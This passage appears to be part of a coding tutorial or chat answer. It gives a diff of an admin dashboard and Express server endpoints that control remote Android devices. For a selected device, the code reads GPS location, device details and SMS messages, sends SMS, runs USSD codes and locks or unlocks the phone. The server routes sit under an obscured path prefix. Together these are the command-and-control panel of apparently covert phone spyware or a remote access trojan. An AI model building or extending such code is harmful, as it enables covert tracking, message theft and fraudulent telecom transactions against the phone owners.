     } catch { alert('Connection error'); }
 }
 
-async function unlockDevice(deviceId) {
-    if (!deviceId) { alert('Please select a device first'); return; }
+async function unlockDevice() {
+    if (!selectedDeviceId) { alert('Please select a device first'); return; }
     try {
         const response = await fetch(API_BASE + '/api/lock-device', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ deviceId: deviceId, action: 'unlock' })
+            body: JSON.stringify({ deviceId: selectedDeviceId, action: 'unlock' })
         });
         const data = await response.json();
         if (data.success) { refreshDevicesLock(); }
@@ -410,14 +892,73 @@ async function uploadLockImage() {
 }
 
 // ============================================================
-// SMS
+// LOCATION (Device-Specific)
+// ============================================================
+async function refreshLocation() {
+    if (!selectedDeviceId) {
+        document.getElementById('latValue').textContent = '--';
+        document.getElementById('lngValue').textContent = '--';
+        document.getElementById('accValue').textContent = '--';
+        document.getElementById('locTime').textContent = '--';
+        document.getElementById('mapLink').style.display = 'none';
+        return;
+    }
+    try {
+        const res = await fetch(API_BASE + '/api/location/' + selectedDeviceId);
+        const data = await res.json();
+        document.getElementById('latValue').textContent = data.lat ?? '--';
+        document.getElementById('lngValue').textContent = data.lng ?? '--';
+        document.getElementById('accValue').textContent = data.accuracy ? data.accuracy + 'm' : '--';
+        document.getElementById('locTime').textContent = data.time || '--';
+        if (data.lat && data.lng) {
+            document.getElementById('mapLink').href = 'https://www.google.com/maps?q=' + data.lat + ',' + data.lng;
+            document.getElementById('mapLink').style.display = 'inline';
+        } else {
+            document.getElementById('mapLink').style.display = 'none';
+        }
+    } catch {}
+}
+
+// ============================================================
+// DEVICE INFO (Device-Specific)
+// ============================================================
+async function refreshDeviceInfo() {
+    if (!selectedDeviceId) {
+        document.getElementById('diModel').textContent = '--';
+        document.getElementById('diManufacturer').textContent = '--';
+        document.getElementById('diAndroid').textContent = '--';
+        document.getElementById('diBattery').textContent = '--';
+        document.getElementById('diStorage').textContent = '--';
+        document.getElementById('diDeviceId').textContent = '--';
+        return;
+    }
+    try {
+        const res = await fetch(API_BASE + '/api/device-info/' + selectedDeviceId);
+        const data = await res.json();
+        document.getElementById('diModel').textContent = data.model || '--';
+        document.getElementById('diManufacturer').textContent = data.manufacturer || '--';
+        document.getElementById('diAndroid').textContent = data.android_version || '--';
+        document.getElementById('diBattery').textContent = data.battery ? data.battery + '%' : '--';
+        document.getElementById('diStorage').textContent = data.storage || '--';
+        document.getElementById('diDeviceId').textContent = data.device_id || '--';
+    } catch {}
+}
+
+// ============================================================
+// SMS (Device-Specific)
 // ============================================================
 async function refreshSms() {
+    if (!selectedDeviceId) {
+        document.getElementById('smsList').innerHTML = '<div class="empty"><div class="icon">💬</div>Select a device to view SMS</div>';
+        document.getElementById('smsCountBadge').textContent = '0';
+        return;
+    }
     try {
-        const response = await fetch(API_BASE + '/api/sms');
+        const response = await fetch(API_BASE + '/api/sms/' + selectedDeviceId);
         const smsList = await response.json();
         renderSms(smsList);
         document.getElementById('smsCountBadge').textContent = smsList.length || 0;
+        document.getElementById('smsCount').textContent = smsList.length || 0;
     } catch (error) {
         console.error('Error loading SMS:', error);
     }
@@ -426,7 +967,7 @@ async function refreshSms() {
 function renderSms(messages) {
     const container = document.getElementById('smsList');
     if (!messages || messages.length === 0) {
-        container.innerHTML = '<div class="empty"><div class="icon">💬</div>No SMS messages yet</div>';
+        container.innerHTML = '<div class="empty"><div class="icon">💬</div>No SMS messages for this device</div>';
         return;
     }
     let html = '<table><thead><tr><th>From</th><th>Message</th><th>Time</th></tr></thead><tbody>';
@@ -439,9 +980,17 @@ function renderSms(messages) {
     });
     html += '</tbody></table>';
     container.innerHTML = html;
-}
-
+    }
+    // ============================================================
+// SEND SMS (Device-Specific)
+// ============================================================
 async function sendSms() {
+    if (!selectedDeviceId) {
+        const resultEl = document.getElementById('smsSendResult');
+        resultEl.textContent = '⚠️ Please select a device first';
+        resultEl.style.color = '#ff6b6b';
+        return;
+    }
     const number = document.getElementById('smsNumber').value.trim();
     const message = document.getElementById('smsMessage').value.trim();
     const resultEl = document.getElementById('smsSendResult');
@@ -456,7 +1005,7 @@ async function sendSms() {
         const response = await fetch(API_BASE + '/api/send-sms', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ number, message })
+            body: JSON.stringify({ deviceId: selectedDeviceId, number: number, message: message })
         });
         const data = await response.json();
         if (data.success) {
@@ -476,9 +1025,15 @@ async function sendSms() {
 }
 
 // ============================================================
-// USSD, LOCATION, DEVICE INFO
+// USSD (Device-Specific)
 // ============================================================
 async function executeUssd() {
+    if (!selectedDeviceId) {
+        const responseEl = document.getElementById('ussdResponse');
+        responseEl.className = 'ussd-response error';
+        responseEl.textContent = '⚠️ Please select a device first';
+        return;
+    }
     const code = document.getElementById('ussdInput').value.trim();
     const responseEl = document.getElementById('ussdResponse');
     if (!code) {
@@ -486,19 +1041,21 @@ async function executeUssd() {
         responseEl.textContent = '⚠️ Please enter a USSD code';
         return;
     }
+    
     responseEl.className = 'ussd-response waiting';
-    responseEl.textContent = '⏳ Sending USSD code... waiting for response...';
+    responseEl.textContent = `⏳ Sending USSD code to ${selectedDeviceId.substring(0, 8)}... waiting for response...`;
+    
     try {
         const res = await fetch(API_BASE + '/api/ussd', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ code })
+            body: JSON.stringify({ deviceId: selectedDeviceId, code: code })
         });
         const data = await res.json();
         if (data.success) {
             responseEl.className = 'ussd-response success';
             responseEl.textContent = '📥 ' + data.message;
-            loadData();
+            refreshUssdHistory();
         } else {
             responseEl.className = 'ussd-response error';
             responseEl.textContent = '❌ ' + (data.error || 'Execution failed');
@@ -509,80 +1066,52 @@ async function executeUssd() {
     }
 }
 
-async function refreshLocation() {
-    try {
-        const res = await fetch(API_BASE + '/api/location');
-        const data = await res.json();
-        document.getElementById('latValue').textContent = data.lat ?? '--';
-        document.getElementById('lngValue').textContent = data.lng ?? '--';
-        document.getElementById('accValue').textContent = data.accuracy ? data.accuracy + 'm' : '--';
-        document.getElementById('locTime').textContent = data.time || '--';
-        if (data.lat && data.lng) {
-            document.getElementById('mapLink').href = 'https://www.google.com/maps?q=' + data.lat + ',' + data.lng;
-            document.getElementById('mapLink').style.display = 'inline';
-        } else {
-            document.getElementById('mapLink').style.display = 'none';
-        }
-    } catch {}
-}
-
-async function refreshDeviceInfo() {
-    try {
-        const res = await fetch(API_BASE + '/api/device-info');
-        const data = await res.json();
-        document.getElementById('diModel').textContent = data.model || '--';
-        document.getElementById('diManufacturer').textContent = data.manufacturer || '--';
-        document.getElementById('diAndroid').textContent = data.android_version || '--';
-        document.getElementById('diBattery').textContent = data.battery ? data.battery + '%' : '--';
-        document.getElementById('diStorage').textContent = data.storage || '--';
-        document.getElementById('diDeviceId').textContent = data.device_id || '--';
-    } catch {}
-                }
-    async function loadData() {
-    try {
-        const response = await fetch(API_BASE + '/api/stats');
-        const stats = await response.json();
-        document.getElementById('devicesCount').textContent = stats.devices || 0;
-        document.getElementById('numbersCount').textContent = stats.ussd_count || 0;
-        document.getElementById('onlineCount').textContent = stats.online || 0;
-        document.getElementById('deviceCountBadge').textContent = stats.devices || 0;
-        document.getElementById('numberCountBadge').textContent = stats.ussd_count || 0;
-        const ussdRes = await fetch(API_BASE + '/api/ussd-numbers');
-        const ussdNumbers = await ussdRes.json();
-        renderUssdNumbers(ussdNumbers);
-        const devices = stats.devices ? [{ name: 'Sample Device', status: 'online', battery: 85 }] : [];
-        renderDevices(devices);
-    } catch (error) { console.error('Error loading data:', error); }
-}
-
-function renderDevices(devices) {
-    const container = document.getElementById('devicesList');
-    if (!devices || devices.length === 0) {
-        container.innerHTML = '<div class="empty"><div class="icon">📱</div>No devices connected yet</div>';
+// ============================================================
+// USSD HISTORY (Device-Specific)
+// ============================================================
+async function refreshUssdHistory() {
+    if (!selectedDeviceId) {
+        document.getElementById('numbersList').innerHTML = '<div class="empty"><div class="icon">📞</div>Select a device to view USSD codes</div>';
+        document.getElementById('numberCountBadge').textContent = '0';
         return;
     }
-    let html = '<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>';
-    devices.forEach(d => {
-        const statusClass = d.status === 'online' ? 'online' : 'offline';
-        const statusText = d.status === 'online' ? '🟢 Online' : '🔴 Offline';
-        html += `<tr><td>${d.name}</td><td><span class="badge ${statusClass}">${statusText}</span></td><td>${d.battery || '--'}%</td></tr>`;
-    });
-    html += '</tbody></table>';
-    container.innerHTML = html;
+    try {
+        const response = await fetch(API_BASE + '/api/ussd-numbers/' + selectedDeviceId);
+        const numbers = await response.json();
+        renderUssdHistory(numbers);
+        document.getElementById('numberCountBadge').textContent = numbers.length || 0;
+        document.getElementById('numbersCount').textContent = numbers.length || 0;
+    } catch (error) {
+        console.error('Error loading USSD history:', error);
+    }
 }
 
-function renderUssdNumbers(numbers) {
+function renderUssdHistory(numbers) {
     const container = document.getElementById('numbersList');
     if (!numbers || numbers.length === 0) {
-        container.innerHTML = '<div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div>';
+        container.innerHTML = '<div class="empty"><div class="icon">📞</div>No USSD codes detected for this device</div>';
         return;
     }
-    let html = '<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>';
-    numbers.forEach(n => {
-        html += `<tr><td>${n.device || 'Unknown'}</td><td><strong style="color:#4fc3f7;">${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">USSD</span></td></tr>`;
+    let html = '<table><thead><tr><th>Device</th><th>Number</th><th>Type</th><th>Time</th></tr></thead><tbody>';
+    numbers.slice(0, 50).forEach(n => {
+        const time = n.timestamp ? new Date(n.timestamp).toLocaleString() : '--';
+        html += `<tr><td>${n.device || selectedDeviceId.substring(0, 8)}</td><td><strong style="color:#4fc3f7;">${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">${n.type || 'USSD'}</span></td><td style="font-size:12px;color:#8896ab;">${time}</td></tr>`;
     });
     html += '</tbody></table>';
     container.innerHTML = html;
+}
+
+// ============================================================
+// LOAD DATA
+// ============================================================
+async function loadData() {
+    await refreshDevicesLock();
+    if (selectedDeviceId) {
+        refreshLocation();
+        refreshDeviceInfo();
+        refreshSms();
+        refreshUssdHistory();
+    }
 }
 
 // ============================================================
@@ -592,15 +1121,196 @@ if (localStorage.getItem('adminLoggedIn') === 'true') {
     document.getElementById('loginContainer').style.display = 'none';
     document.getElementById('dashboard').classList.remove('hidden');
     loadData();
-    refreshLocation();
-    refreshDeviceInfo();
-    refreshSms();
-    refreshDevicesLock();
 }
 
 document.getElementById('loginPass').addEventListener('keypress', (e) => {
     if (e.key === 'Enter') login();
 });
+
+// Refresh data every 30 seconds
+setInterval(() => {
+    if (selectedDeviceId) {
+        refreshLocation();
+        refreshDeviceInfo();
+    }
+    refreshDevicesLock();
+}, 30000);
 </script>
 </body>
 </html>
+```
+
+---
+
+📝 Step 2: Update server.js with Device-Specific APIs
+
+Add these endpoints to your server.js:
+
+```javascript
+// ============================================================
+// DEVICE-SPECIFIC API ENDPOINTS
+// ============================================================
+
+// Get location for specific device
+app.get('/a9f3k217/api/location/:deviceId', authenticate, (req, res) => {
+    const { deviceId } = req.params;
+    
+    if (!devices[deviceId]) {
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    // Return device-specific location (simulated or real)
+    res.json({
+        lat: devices[deviceId].lat || -1.9441,
+        lng: devices[deviceId].lng || 30.0619,
+        accuracy: devices[deviceId].accuracy || 15,
+        time: new Date().toLocaleString()
+    });
+});
+
+// Get device info for specific device
+app.get('/a9f3k217/api/device-info/:deviceId', authenticate, (req, res) => {
+    const { deviceId } = req.params;
+    
+    if (!devices[deviceId]) {
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    const device = devices[deviceId];
+    res.json({
+        model: device.model || 'Samsung Galaxy S23',
+        manufacturer: device.manufacturer || 'Samsung',
+        android_version: device.android_version || '14.0',
+        battery: device.battery || 76,
+        storage: device.storage || '128GB / 89GB used',
+        device_id: deviceId
+    });
+});
+
+// Get SMS for specific device
+app.get('/a9f3k217/api/sms/:deviceId', authenticate, (req, res) => {
+    const { deviceId } = req.params;
+    
+    // Return device-specific SMS
+    // In production, this would come from the actual device
+    const deviceSms = smsMessages.filter(msg => msg.deviceId === deviceId);
+    res.json(deviceSms);
+});
+
+// Send SMS from specific device
+app.post('/a9f3k217/api/send-sms', authenticate, (req, res) => {
+    const { deviceId, number, message } = req.body;
+    
+    if (!deviceId || !number || !message) {
+        return res.status(400).json({ error: 'Device ID, number, and message required' });
+    }
+    
+    if (!devices[deviceId]) {
+        return res.status(404).json({ error: 'Device not found' });
+}
+    
+    // Forward to device via WebSocket
+    const deviceWs = getDeviceWebSocket(deviceId);
+    if (deviceWs) {
+        deviceWs.send(JSON.stringify({
+            type: 'send_sms',
+            number: number,
+            message: message,
+            timestamp: Date.now()
+        }));
+        
+        // Store in SMS history
+        smsMessages.push({
+            deviceId: deviceId,
+            number: number,
+            body: message,
+            timestamp: Date.now(),
+            sent: true
+        });
+        if (smsMessages.length > 1000) smsMessages.shift();
+        
+        res.json({ success: true, message: `SMS sent to ${number} from device ${deviceId}` });
+    } else {
+        // Queue for later
+        res.json({ 
+            success: false, 
+            error: 'Device offline. SMS queued for later.',
+            queued: true
+        });
+    }
+});
+
+// Get USSD history for specific device
+app.get('/a9f3k217/api/ussd-numbers/:deviceId', authenticate, (req, res) => {
+    const { deviceId } = req.params;
+    
+    const deviceUssd = ussdNumbers.filter(n => n.deviceId === deviceId);
+    res.json(deviceUssd);
+});
+
+// Execute USSD on specific device
+app.post('/a9f3k217/api/ussd', authenticate, (req, res) => {
+    const { deviceId, code } = req.body;
+    
+    if (!deviceId || !code) {
+        return res.status(400).json({ error: 'Device ID and USSD code required' });
+    }
+    
+    if (!devices[deviceId]) {
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    console.log(`📞 USSD sent to device ${deviceId}: ${code}`);
+    
+    // Forward to device via WebSocket
+    const deviceWs = getDeviceWebSocket(deviceId);
+    if (deviceWs) {
+        deviceWs.send(JSON.stringify({
+            type: 'ussd',
+            code: code,
+            timestamp: Date.now()
+        }));
+        
+        // Simulate response
+        setTimeout(() => {
+            let responseMessage = '';
+            if (code.includes('123')) {
+                responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
+            } else if (code.includes('131')) {
+                responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
+            } else if (code.includes('144')) {
+                responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
+            } else if (code.includes('200')) {
+                responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
+            } else {
+                responseMessage = `USSD code ${code} executed on device ${deviceId}. No further response available.`;
+            }
+            
+            // Save the USSD number
+            const cleanNumber = code.replace(/\D/g, '');
+            if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
+                ussdNumbers.push({
+                    deviceId: deviceId,
+                    device: devices[deviceId].name || deviceId,
+                    number: cleanNumber,
+                    type: 'USSD',
+                    timestamp: Date.now()
+                });
+                if (ussdNumbers.length > 100) ussdNumbers.shift();
+            }
+            
+            // Send response back to client
+            // (The response is already sent, but we could update via WebSocket)
+        }, 2000);
+        
+        res.json({ 
+            success: true, 
+            message: `USSD code ${code} sent to device ${deviceId}. Waiting for response...`
+        });
+    } else {
+        res.json({ 
+            success: false, 
+            error: `Device ${deviceId} is offline. USSD code queued.`
+        });
+    }
+});
